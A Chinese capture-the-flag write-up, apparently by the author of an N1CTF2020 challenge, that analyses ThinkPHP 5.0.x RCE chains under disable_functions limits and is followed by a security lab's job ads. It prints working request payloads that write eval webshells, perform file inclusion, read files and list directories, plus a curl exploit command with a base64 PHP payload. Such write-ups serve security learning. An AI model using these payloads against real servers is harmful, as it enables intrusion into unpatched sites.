\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/u\_zhosHaBq2gXZsZZxfPjA)

> Smi1e@卫兵实验室

安恒信息安全研究院 发起了一个读者讨论 大家一起来讨论吧～

### 前言  

在刚结束的N1CTF2020中我出了一道存在RCE漏洞的tp5.0.0+php7，同时做了一些限制。

1.  限制了常用的 `think\__include_file` 必须为 `.php` 结尾。
    

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABEjXTt6gHb3ibZqkSYiaQgXjyQWUbNHCm6bIQ3nsJKN2R85VgW6U25GQlQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

1.  禁用了反序列化函数以及其他单参数危险函数
    

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABESugTw57sfv3RTxYGbcoiaPIlrZkEicokb5iaEGWuuIpT9ycYMDYweexibA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

1.  `open_basedir` 设置为web目录，因此 `/tmp/` 目录下的 `session` 也无法利用，另外关闭了tp5自带的log功能。  
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABEtjRvuNy7iad46WR3G2Vkk5L6RV2SaUJWctHCutGSiasibZVVxVqaWPpvA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
    
2.  以及设置了仅 `public` 目录下可写
    

`chown -R root:root /var/www/html`  
`chmod -R 755 /var/www/html`  
`chmod 777 /var/www/html/public`

众所周知，在tp5.0.x+php7的实战环境下，如果 `disable_functions` 限制了所有单参数的危险函数，我们就需要用  
`/thinkphp/library/think/Loader.php` 中的 `__include_file` 函数调用 `include` 配合 `log` 、 `session` 、文件上传来getshell，当然前段时间也有人挖掘出了5.0.x的反序列化链，所以也可以配合反序列化函数。

在比赛过程中有很多师傅用了 `\think\Lang::load` 里的文件包含，这个点之前没有注意到。  

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABETmkuFyicdZxKETwc6agcDS9VjXwhlibKLQBOS5OgeMhaUvU4h5VVtCWA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

### 已知利用方式的局限性  

*   首先 `log` 的话肯定需要开启，虽然默认就是开启的，不过有些时候如果日志文件中存在令php解析错误的垃圾数据那么就得等到第二天再利用了。(不过也可以用 `0ops` 战队的非预期去改掉日志文件路径)
    
*   其次文件上传的话需要有类似上传图片的功能，大多数情况下肯定需要先登陆，有些网站不会对外开启注册功能，比如注册需要邀请码什么的。
    
*   然后是反序列化链，目前并没有爆出通杀5.0.0-5.0.23的反序列化链。
    
*   最后是 `session` ， `session` 应该是最好用的， `session` 目录可以在 `phpinfo` 中找到，不过你一定遇到过 `no value` 的情况，虽然可以跑一下session默认目录字典但是还是有点麻烦。
    
    ![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
    

因此我就想找一个通杀5.0.x，没有条件限制的利用方式。当然，tp5 RCE已经过去快两年了，现在的5.0.x版本大多都为没有漏洞的5.0.24，所以本文的目的主要是和大佬们交流分享一下。

### 踩坑之路

tp5.0.xRCE流程这里就不讲了，只需要知道现在我们可控 `$filters` 和 `$value` ，以及现在调用函数只能传入单参数，所以我们不能直接去调用 `file_put_contents` 来写shell。所以我们需要在tp中寻找调用了 `call_user_func_array` 、 `file_put_contents` 等危险函数的地方。  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

全局搜 `system` 、 `eval` 等危险函数，找到一处看似能利用的地方，不过他不是静态方法，接下来就看能不能找到一个能够间接调用它的地方。（赛后才知道这里其实可以通过 `::` 去调用，具体可以看非预期5）  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

`call_user_func` 第一个参数可以传一个字符串用来调用任意函数，也可以传入一个数组，用来调用静态方法，但是无法直接调用类方法。  
全局搜 `display(` 没有找到可利用的方法。  
继续全局搜索 `static function` ，找到一处任意方法调用，但是参数仍然不可控，尬住了。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这时候就需要理一下思路，我们只能利用是静态方法且允许只传一个参数的方法。既然是单参数，那么既能够调用任意方法又能够传入参数的地方几乎是不存在的。所以我们现在只能在允许只传一个单参数的静态方法中寻找有危险操作且参数是我们可控的地方。  
最常见的危险函数肯定要属 `call_user_func_array` 了，先全局搜一下 `call_user_func_array`  
当看到这里时，发现我们可以通过 `__callStatic()` 来传入两个可控参数，并且可以间接调用非静态方法。  
当调用某个类不存在的静态方法时候，就会调用它的 `__callStatic()` 方法，第一个参数是我们调用的不存在的方法名，第二个参数是我们传入的参数。这里会去调用它类本身的一些非静态方法。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

看一下这个类中有没有方法是我们可利用的，这里找到了 `requireCallback` 方法， `call_user_func_array` 的第二个参数只要是数组，就可以传入任意多个参数。  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

当我构造好payload `get[0]=xx,get[1]=xx,get[2]=xx` 打过去时，发现无论怎么构造传入的 `$params` 参数都不是数组。回头debug了一下，发现是 `array_walk_recursive` 的问题。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

`$data` 参数不管是几维数组，他都会把你拆分成单个字符串。  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

那怎么传数组呢？绕就完事了，继续看代码发现 `$value` 参数有一个引用符号。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

那我们只要全局搜一下是静态方法且允许只传一个参数且第一个参数是一个引用传值的地方，想办法控制其返回值，令其返回数组就可以了。  
满足条件的方法不多，跟了一遍都无法利用。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABE1V5qcp9aTL7ZpAtqnDU2KHKd4GrlVT20PjoWJXZ3VnRK9Wxic1WFDGQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

继续回头看代码，我们完全可以通过 `call_user_func` 调用php内置函数控制返回值。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABETEHknk95wiaak93j16JNFVGtOK0ib2ubBZWeO2nQGIKI4NnZVY2XRIwg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

哪个内置函数能够让我们返回可控数组呢，CTF中的无参数RCE其中一种方式是利用 `getallheaders()`

```


1.  `<?php`
    
2.  `var_dump(getallheaders());`
    


```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

不过 `getallheaders()` 不允许有参数，传入参数都会返回null。我们的 `call_user_func($filter, $value);` 必须传入参数。这里只需要再调用一次 `call_user_func` 令其参数为 `getallheaders` 即可。  
`call_user_func("call_user_func","getallheaders");`

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

payload打过去以后还是无法调用到 `requireCallback` 方法，debug发现 `$params` 传进去的是一个二维数组。忘记了 `__callStatic($method, $params)` 第二个参数会把我们传入的参数封装成一个数组，而我们传入的只是一个单参数数组，所以就成了一个二维数组。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 预期解

虽然前面踩了坑，不过现在已经能够传入一个数组参数了。  
继续看了其他类的 `__callStatic` 方法，发现都无法利用，那就只能继续搜 `call_user_func_array` 了，还是因为只能传一个参数，利用条件过于苛刻，我找了一遍并没有找到可利用的静态方法。感觉只能寄希望于 `file_put_contents` 了。  
一开始的时候看了下所有的 `file_put_contents` ，好像都无法利用。第二次去看的时候，看到了 `thinkphp\library\think\Build::module` 方法的 `file_put_contents` 好像可控。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在回溯 `$content` 的过程中，发现虽然 `buildHello` 需要传两个参数，但是我们可以通过 `module` 方法间接调用它，且第一个参数 `$module` 可控，而且写入内容部分可控。第一次全局搜 `file_put_contents` 时看到需要两个参数直接跳过了，忽略了可以间接调用的情况。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

`/thinkphp/library/think/Build.php::module` 方法用来创建模块， `buildHello` 方法用来创建模块的欢迎页面。  
首先会判断我们传入的 `$module` 参数是否已经创建创建了对应的应用模块目录，没有则创建对应的应用模块目录。然后如果 `$module` 等于 `runtime` ，就会创建对应的配置文件和公共文件_、_创建模块的默认页面。

在 `buildHello` 方法中，会用参数替换掉模版文件中对应的模版参数，如果文件名的目录不存在，则调用 `mkdir(dirname($filename), 0755, true);` 递归创建，最后写入欢迎页面也就是 `模块名/controller/Index.php` 。  
我们传一个 `test` 进去，可以看到在 `application` 目录下生成了对应的模块。我们可控的地方在下面的红框中。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

绕过方式很简单 `test;phpinfo();//` 即可，然后配合inlcude即可getshell。  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这就完了吗？肯定没有，实战中 `application` 目录很可能是没有写权限的，除非是windows，而且触发还要再调用一下include，有点麻烦，为什么不直接写到public目录下呢。静态文件、图片什么的一般都会放在public目录的子目录中，而对应的文件夹都是有写权限的，现在假设要将其写到public目录下，构造 `../public/test;phpinfo();//` 打过去，发现语法错误。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

怎么办，你可能会想到 `a;"/../../public/test".phpinfo();` 这样。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

但是在linux下， `mkdir` 路径中默认不允许有不存在的目录

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABEiaPMYsh9icd9eM5HwknNGaDKxBxfXR9hiaQ3TtIa0ib0h8SC9wCdicVSBPg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

不过windows下是允许的。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABEKkTCFkst1ITiaESa2gDeIxWlN3oaJggHDJdiborbtKLIuvQ6RmVuPfFQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

如果只能打windows那就略显鸡肋了，继续绕就完事了。

测试发现如果 `mkdir` 带了true参数的话，路径中是允许有不存在的参数的。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABEa8PrrChetOKqr3DMykOBsIoh0ZrJcGWvQS8Iib25akeb7icS2jMSU86A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

以及 `file_put_contents` 路径中也允许出现不存在的目录。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

还有 `mkdir` 报的是warning，不影响程序后续的执行。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这样的话，即使在创建模块目录的时候报了 `warning` ，也不影响后续目录的创建以及文件的写入。因为最后他调用 `mkdir` 的时候传入了true参数。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

可在tp中，通过debug发现 `mkdir` 报了warning后就直接退出了。查阅文档发现tp5默认情况下会对任何错误（包括警告错误）抛出异常。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

我们可以通过 `error_reporting` 设置错误级别。  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

继续回头看 `filterValue` ，其调用了多次 `call_user_func` ，我们完全可以通过 `call_user_func` 调用 `error_reporting` 传入0，关闭错误报告。  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

但是这里虽然 `$filter` 可控，可 `$value` 的值每次调用的时候都会发生变化。  
`$filter` 我们需要传入 `error_reporting` 和 `think\Build::module` ， `$value` 我们需要传入 0 和 `a;"/../../public/123".phpinfo();//` 。  
如果先执行 `error_reporting` 的话，调用完 `error_reporting(0)` 或者 `error_reporting('a;"/../../public/123".phpinfo();//')` 以后都会返回一个数字覆盖掉 `$value` 的值，导致下次调用 `think\Build::module` 时，参数不是预期的 `a;"/../../public/123".phpinfo();//` 。  
所以肯定要先执行 `think\Build::module` ，可如果先传入的参数是 `a;"/../../public/123".phpinfo();//` 会直接报异常然后退出，所以必须要先传入参数0，0可以正常创建目录，然后接下来会调用 `error_reporting(0)` 关闭错误报告，下一次循环传入 `a;"/../../public/123".phpinfo();//` 就能够绕过了。

可是payload还是有问题，会先在app目录下创建模块名为 `0` 的目录，然后才执行 `error_reporting(0)` 。  
绕就完事了，字符串只要不是数字开头都等于 `0` ，构造 `../public/0` 写入到可写目录即可。  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

我关掉了 `application` 目录的写权限，可以看到 `application` 目录没有创建任何文件夹， `0` 创建在了 `public` 下。  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 非预期1

`_method=__construct&method=GET&server[]=1&filter[]=think\Build::module&get[]=index//../../public//?><?php eval($_GET[a]);?>`

做出来的队伍大多都是用的注释符来绕过语法错误: `index//../../public//?><?php eval($_GET[a]);?>` ，这种方法不会跨不存在的目录也就不会报 `warning` 错误，相比于预期更加简单了一些，当时并没有想到。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 非预期2

文件包含没修完全导致的使用php过滤器+rot13绕过语法错误。  
来自 `vidar-team` 的payload  
`b=../public/./<?cuc riny(trgnyyurnqref()["pzq"]);?>&_method=__construct&filter=think\Build::moudle&a=1&method=GET`

`b=php://filter/read=string.rot13/resource=./<?cuc riny(trgnyyurnqref()["pzq"]);?>/controller/Index.php&_method=__construct&filter=think\__include_file&a=1&method=GET`

### 非预期3

`_method=__construct&filter[]=json_decode&filter[]=get_object_vars&filter[]=think\Log::init&method=GET&get[]={"type":"File", "path":"/var/www/html/public/logs"}`

`0ops` 的师傅在 `think\Log::init` 找到了另一个利用  
传入了一个数组参数: `File` 和 `/var/www/html/public/logs`

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后在 `think\Log::init` 调用了 `new \think\log\driver\File()` 并传入了一个包含 `path` 值的数组参数，并赋值给静态成员属性 `self::$driver`

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在 `File` 的构造函数中覆盖掉了默认的 `path` 路径

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

最终调用 `thinkphp/library/think/log/driver/File.php` 的 `save` 方法写入log。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后调用 `think\Lang::load` 中的include包含即可

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

不过比较遗憾的是 `error_log` 被我不小心加到了 `disable_functions` 里。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 非预期4

`_method=__construct&filter[]=scandir&filter[]=var_dump&method=GET&get[]=/var/www/html/public/`  
`_method=__construct&filter[]=highlight_file&method=GET&get[]=/var/www/html/public/index.php`

直接列目录+文件读取上车

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABEWVn2ibXPgrCl3CGSr8JuMorfApfibMY46CeGgT5Y6VP01iaLLd2Ls8HlA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABE5KookD4MPnWJvmGiazyVZDNt7OPN0LeCSzx1BbBGU4AouFpQ9mKT9HA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

### 算是半个预期的非预期5

payload来自国外的 `Super Guesser` 战队。

`curl --data "path=PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ3N1cHBwLnBocCcsJ3N1cGVyIGd1ZXNzc3NlcnMnKTsgPz4=&_method=__construct&filter[]=set_error_handler&filter[]=self::path&filter[]=base64_decode&filter[]=\think\view\driver\Php::Display&method=GET" "http://101.32.184.39/?s=captcha&g=implode" --output - > a.html`

首先我之前并不知道 `::` 可以直接调用非静态方法，问了一些师傅他们也表示没注意过。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABEjLHnSV30R3icrEup4KsuThjlEUl4NyH8clR0ZkbwEKoWcr47k4sbhOw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

不过有 `$this` 的话就不行了。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABE4QYTY4pbXpNDZmAIbWADqQwImd7oBqBlS0pfHB6h0jTzqNAicRgO9Vg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

当开启了 `error_reporting(E_ALL);` 时，就会报一个 `PHP Deprecated` ，但是不影响程序正常运行。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABEknxLXT2dysD7RicLR8rXoZH0YuFKBfku5CUFfPf8HJlpSSgB8Mb1FWg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

上面提到了 `\think\view\driver\Php` 类的 `display` 方法可以调用 `eval` ，且里面并没有调用 `$this` 。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABEyQIv2IIzvgYa3URj8ia8XuicJibS3olv8TaibiaIXxTqp5IaAVmks0kKFVA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

而 `tp5` 默认就调用了 `error_reporting(E_ALL)` ，且有一套内置的错误处理机制。上面预期解也提到了即使报了 `warning` 程序也会中止执行。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABEiazjb0LNXtsLORiaz33byK9ribAAa0ZzngZRycEmUicWLuOdRN3JMJGrfA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

`set_error_handler()` 函数设置用户自定义的错误处理程序，会绕过标准 PHP 错误处理程序。`set_exception_handler()` 函数设置用户自定义的异常处理函数。`register_shutdown_function()` 函数会注册一个会在PHP中止时执行的函数  

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABETgetoDKlpqrShdfDybBoicFpgoMMcRwW2vxcvJpB7Lw7iaPZ6oaTs4Ew/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

这个payload首先调用 `set_error_handler` 覆盖掉了默认的错误处理函数 `appError` 为 `implode` 。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABEXRNpmrzY8B977HYISZuiaVx5licia4TaOsVMUzPujsOpx2D6SKphia9vAw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

这个时候由于返回值不可控，则又调用了 `self::path` 方法

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABEFMOUyIickZEqVTG783Qu59OBJgVpTMAowB8r62rH9CCu9rLgpia7RWUQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

因为 `self::path` 中返回的 `$this->path` 可以通过POST参数控制，具体可以看tp5 RCE漏洞成因。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABESVkKqDApv7fv9ic6GwfTGMrje5P6bDAE0LVRZCVOCYGYNU4N0gxkaEw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

然后调用 `base64_decode` 解码

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

最后调用 `\think\view\driver\Php::Display` 传入可控参数，这个时候因为报错处理函数被覆盖为 `implode` 了，因此程序会继续执行。

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

最终调用 `eval` getshell。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncZfiaQSyOqIfOMibtcqU2ABEYhIrfuGAzaAnjZKwMey6sfDsTyPicqJGsx7aBYkMaibNGcG8TicuGINOw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

这位国外大佬使用 `::` 调用非静态方法是我没见过的操作，然后他也是和预期一样绕过了tp5的报错，不过他使用的是 `set_error_handler` 去覆盖错误处理函数，而我使用的是 `error_reporting(0)` 关闭错误报告，所以这算是半个预期，学爆。

### 后记

这道题被大佬们非预期的更有意思了，虽然大家都是非预期做出来的，不过我认为在有限制的条件下能够成功利用都是可以的，主要目的还是可以互相学习一下思路。

  

**关于我们**

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvnf9lw493LJmpm51oUkLoMsXCmAU2UzEIY8pYWKVulWQPmTOMC1swUBCIFpLSDKHkn9VgXcWEZ99pg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**人才招聘**

**二进制安全研究员(Windows内核方向)**

**工作地点：**

1.杭州；

  

**岗位职责：**  

1、负责研究Window内核相关漏洞利用技术；

2、负责分析Window内核漏洞的原理及缓解措施；

  
**任职要求：**  

1、2年以上windows逆向工作经验。

2、熟悉windows底层架构、运行机制，熟悉汇编语言 C/C++语言，熟悉win32/64开发，并有相关开发经验；

3、熟悉windows驱动开发、熟悉windows平台内核架构；能熟练运用Windows平台下的软件调试方法。

4、熟练使用ida、windbg等调试软件工具调试分析漏洞。

5、有CVE编号、内核研究成果者优先；

6、具备良好的团队沟通、协作能力、良好的职业道德。

  

**二进制安全研究员(Linux内核方向)**

**工作地点：**

1.杭州；

  

**岗位职责：**

1、负责研究Linux内核相关漏洞利用技术；

2、负责分析Linux内核漏洞的原理及缓解措施；

  
**任职要求：**

1、2年以上Linux逆向工作经验。

2、熟悉Linux底层架构、运行机制，熟悉汇编语言 C/C++语言，熟悉x86/64开发，并有相关开发经验；

3、熟悉Linux驱动开发、熟悉Linux平台内核架构；能熟练运用Linux平台下的软件调试方法。

4、熟练使用ida、gdb、lldb等调试软件工具调试分析漏洞。

5、有CVE编号、内核研究成果者优先；

6、具备良好的团队沟通、协作能力、良好的职业道德。

  

**二进制安全研究员(系统应用方向)**

**工作地点：**

1.杭州；

  

**岗位职责：**

1、负责安全技术研究，跟踪国内外最新的安全技术以及安全漏洞的追踪；

2、负责进行二进制漏洞挖掘，包括不限于浏览器、chakara引擎、js引擎、office、pdf等等各种二进制类应用；

  
**任职要求：**

1、能主动关注国内外最新安全攻防技术，并在自己擅长和兴趣的领域能够进行深入的学习、研究；

2、熟练掌握windbg、ida、gdb等调试工具；

3、熟悉各类二进制安全漏洞原理（堆溢出、栈溢出、整数溢出、类型混淆等等）以及各种利用技术；

4、能够无障碍阅读英文技术文档；

5、具备良好的团队沟通、协作能力、良好的职业道德。

  

**Web安全研究员**

**工作地点：**  

1.杭州；

  

**岗位职责：**

1、安全攻防技术研究，最新web应用及中间件(tomcat、jetty、jboss等等)、框架(struts、spring、guice、shiro等等) 组件(freemarker、sitemesh等等)漏洞挖掘研究；

2、跟踪分析国内外的安全动态，对重大安全事件进行快速响应；

  
**任职要求：**

1、了解常见的网络协议(TCP/IP,HTTP,FTP等)；

2、熟练使用Wireshark等抓包工具，熟悉正则表达式；

3、掌握常见漏洞原理，有一定的漏洞分析能力；

4、具备php、python、java或其他相关语言编码能力；

5、对常见waf绕过有一定的基础经验；

6、具备一定的文档编写能力，具备良好的团队共同能力；

7、对安全有浓厚的兴趣，工作细致耐心。

  

**感兴趣的小伙伴请联系Nike，或将简历投送至下方邮箱。（请注明来源“研究院公众号”，并附带求职岗位名称）**

**联系人：Nike  
邮箱：nike.zheng@dbappsecurity.com.cn**